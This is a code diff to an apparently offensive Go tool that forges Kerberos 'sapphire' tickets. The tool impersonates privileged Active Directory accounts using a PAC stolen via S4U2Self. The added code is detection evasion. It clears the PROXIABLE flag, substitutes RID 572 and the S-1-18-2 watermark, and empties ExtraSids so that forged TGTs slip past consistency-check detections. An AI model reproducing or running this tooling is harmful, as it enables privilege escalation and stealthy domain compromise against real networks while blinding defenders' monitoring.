@@ -209,6 +209,26 @@ type SapphireTicketRequest struct {
 	// forged TGT's AuthTime. Legit TGTs have these equal; sapphire inherits
 	// the S4U2Self issuance time instead. Consistency-check detections flag this.
 	SyncClientInfoTime bool
+
+	// StripProxiable clears the PROXIABLE bit (0x10000000) in the forged TGT's
+	// EncTicketPart.Flags. Legit TGTs for protected/privileged accounts (e.g.,
+	// Domain Admins) do NOT have PROXIABLE — the KDC denies it per account
+	// policy. Sapphire inherits the attacker's TGT flags which typically carry
+	// PROXIABLE for non-protected accounts. Clearing makes the flag set match
+	// a legit TGT for the impersonated privileged account.
+	StripProxiable bool
+
+	// StripExtraGroups zeros the GROUP_MEMBERSHIP entry for RID 572 (Denied
+	// RODC Password Replication Group) in LOGON_INFO. S4U2Self PACs include
+	// this via transitive group resolution; AS-REQ PACs do not. Matches the
+	// group list to what a legitimate kinit-issued TGT would carry.
+	StripExtraGroups bool
+
+	// ClearExtraSids sets KERB_VALIDATION_INFO.SidCount=0 and the ExtraSids
+	// pointer=NULL in LOGON_INFO, matching the legit kinit AS-REQ TGT
+	// baseline (no authority-18 SIDs, no Authenticated-Users stub — truly
+	// empty ExtraSids).
+	ClearExtraSids bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -462,20 +482,18 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		}
 	}
 
-	// Step 3.75: Optionally strip the S-1-18-2 watermark from the stolen PAC.
-	// S-1-18-2 (SERVICE_ASSERTED_IDENTITY) is the KDC's watermark for S4U2Self
-	// tickets. A TGT carrying it is structurally impossible from a legitimate AS-REQ,
-	// so it can be used by detections to identify sapphire tickets regardless of
-	// tool-specific wire fingerprints. Rewriting to S-1-18-1 makes the PAC look
-	// like it came from a normal AS authentication.
+	// Step 3.75: Optionally substitute S-1-18-2 → S-1-5-11 (Authenticated Users)
+	// in ExtraSids. Legit AS-REQ TGTs carry no authority-18 SID at all, but true
+	// removal requires NDR edits. Substituting with a 12-byte benign SID
+	// preserves PAC validity while eliminating the authority-18 watermark.
 	if req.StripWatermark {
-		fmt.Println("[*] Step 3.75: Stripping S-1-18-2 watermark (rewriting to S-1-18-1)...")
+		fmt.Println("[*] Step 3.75: Substituting S-1-18-2 → S-1-5-11 (Authenticated Users)...")
 		var n int
 		stolenPAC, n = pac.RewriteServiceAssertedIdentity(stolenPAC)
 		if n > 0 {
-			fmt.Printf("[+] Rewrote %d S-1-18-2 → S-1-18-1\n", n)
+			fmt.Printf("[+] Substituted %d S-1-18-2 → S-1-5-11\n", n)
 		} else {
-			fmt.Println("[!] No S-1-18-2 found to rewrite (PAC may not carry the watermark)")
+			fmt.Println("[!] No S-1-18-2 found to substitute (PAC may not carry the watermark)")
 		}
 	}
 
@@ -535,6 +553,35 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			fmt.Printf("[+] Removed PAC_TICKET_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
 		} else {
 			fmt.Println("[!] No PAC_TICKET_CHECKSUM buffer present")
+		}
+	}
+
+	// Step 3.76b: Optionally clear ExtraSids entirely — sets SidCount=0 and
+	// the ExtraSids pointer to NULL. Must run AFTER --strip-watermark (if
+	// enabled) so any substitution is also cleared.
+	if req.ClearExtraSids {
+		fmt.Println("[*] Step 3.76b: Clearing ExtraSids (SidCount=0, pointer=NULL)...")
+		var n int
+		stolenPAC, n = pac.ClearExtraSids(stolenPAC)
+		if n > 0 {
+			fmt.Println("[+] ExtraSids cleared")
+		} else {
+			fmt.Println("[!] ExtraSids already empty or layout unexpected")
+		}
+	}
+
+	// Step 3.805: Optionally substitute RID 572 → RID 513 (Domain Users) in
+	// LOGON_INFO.GroupIds. S4U2Self PACs include RID 572 via transitive group
+	// resolution; legit AS-REQ PACs don't. True removal needs NDR edits; we
+	// substitute to preserve validity.
+	if req.StripExtraGroups {
+		fmt.Println("[*] Step 3.805: Substituting RID 572 → RID 513 (Domain Users)...")
+		var n int
+		stolenPAC, n = pac.StripDeniedRODCGroup(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Substituted %d group entry/entries\n", n)
+		} else {
+			fmt.Println("[!] No RID 572 group entry found in LOGON_INFO")
 		}
 	}
 
@@ -645,8 +692,19 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		// stamped by the KDC during S4U2Self, so changing AuthTime breaks
 		// PAC validation (KRB_AP_ERR_MODIFIED). Only EndTime, RenewTill,
 		// and Flags are safe to override — none of them are bound to PAC data.
+		//
+		// Flag byte 0: FORWARDABLE (0x40) | optional PROXIABLE (0x10).
+		// Legitimate TGTs for protected/privileged accounts (Domain Admins,
+		// Protected Users) are issued WITHOUT PROXIABLE — the KDC denies it
+		// per account policy. Forged sapphire tickets impersonating these
+		// accounts should also omit PROXIABLE to match the expected baseline.
+		flagByte0 := byte(0x50) // FORWARDABLE + PROXIABLE (default, for non-protected accounts)
+		if req.StripProxiable {
+			flagByte0 = 0x40 // FORWARDABLE only (protected/privileged account baseline)
+			fmt.Println("[*] Clearing PROXIABLE bit from EncTicketPart.Flags (--strip-proxiable)")
+		}
 		modifiedEncPart.Flags = asn1.BitString{
-			Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // fwd+proxy+renew+init+preauth+enc-pa-rep
+			Bytes:     []byte{flagByte0, 0xe1, 0x00, 0x00}, // fwd[+proxy]+renew+init+preauth+enc-pa-rep
 			BitLength: 32,
 		}
 		// Inherit EndTime / RenewTill from the bootstrap TGT so the forged
